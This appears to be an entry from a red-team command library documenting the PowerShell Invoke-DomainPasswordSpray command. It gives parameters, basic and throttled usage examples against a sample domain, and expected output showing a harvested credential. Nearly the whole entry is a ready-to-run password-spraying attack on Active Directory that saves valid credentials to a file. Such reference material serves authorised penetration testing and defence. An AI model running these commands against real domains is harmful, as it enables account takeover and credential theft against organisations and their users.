---
id: de7e824a-31f2-4d7a-b2e4-ff0ce6d2ba55
name: invoke-domain-password-spray-with-user-and-password-lists
type: command
executor: powershell
data: >-
  Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name
  -PasswordList passlist.txt -OutFile sprayed-creds.txt
output: null
created_at: '2023-04-06T03:56:04.297500+00:00'
updated_at: '2023-04-10T20:25:55.315382+00:00'
platforms:
  - Windows
tags:
  - password-spraying
  - active-directory
verified: true
validated: true
---

# invoke-domain-password-spray-with-user-and-password-lists

## Command

```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

## Description

This command performs targeted password spraying using lists of users and passwords, outputting valid credentials to a file for domain authentication testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -UserList users.txt | File with usernames (one per line) | Yes |
| -Domain domain-name | Target domain FQDN | Yes |
| -PasswordList passlist.txt | File with passwords (one per line) | Yes |
| -OutFile sprayed-creds.txt | Output file for valid creds | No |

## Examples

### Basic Usage

```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Domain contoso.com -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

### Advanced Usage

```powershell
Invoke-DomainPasswordSpray -UserList admins.txt -Domain contoso.com -PasswordList common.txt -Throttle 10
```

## Expected Output

[+] Spraying complete. Valid credentials saved to sprayed-creds.txt
Content: jdoe:Password1

## Related

- [[procedures/Password-Spraying-with-Pre-Generated-Passwords]]
- [[tools/DomainPasswordSpray]]
